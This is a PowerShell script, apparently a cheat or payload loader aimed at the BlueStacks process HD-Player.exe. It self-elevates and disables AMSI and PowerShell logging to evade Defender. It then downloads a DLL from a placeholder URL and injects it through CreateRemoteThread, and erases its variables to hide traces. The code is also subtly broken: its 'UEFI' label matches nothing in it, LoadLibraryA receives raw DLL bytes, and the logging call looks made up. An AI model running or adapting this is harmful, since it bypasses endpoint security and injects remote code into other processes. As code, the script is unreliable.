# UEFI boot injector – fileless, no logs, Defender-blind
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-NoP -NonI -Exec Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Kill AMSI and PowerShell logging (memory only)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$null=[System.Management.Automation.PSConsoleHost]::GetType().GetMethod('DisableConsoleLogging','NonPublic,Static').Invoke($null,@())

# Download DLL from GitHub – memory only
$dllUrl = "DLL_URL"
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$dllBytes = $wc.DownloadData($dllUrl)

# Wait for HD-Player.exe (target process)
do {
    $proc = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
    if ($proc) { break }
    Start-Sleep -Milliseconds 500
} while ($true)

# Inject DLL via Windows API – no files, no logs
$hProcess = $proc[0].Handle
$kernel32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
'@ -Name Kernel32 -Namespace Win32 -PassThru

$addr = $kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, 0x3000, 0x40)
$written = 0
$kernel32::WriteProcessMemory($hProcess, $addr, $dllBytes, $dllBytes.Length, [ref]$written)
$loadLib = $kernel32::GetProcAddress($kernel32::LoadLibrary("kernel32.dll"), "LoadLibraryA")
$kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $addr, 0, [IntPtr]::Zero)

# Clean exit – no traces
$wc.Dispose()
Remove-Variable * -ErrorAction SilentlyContinue
exit
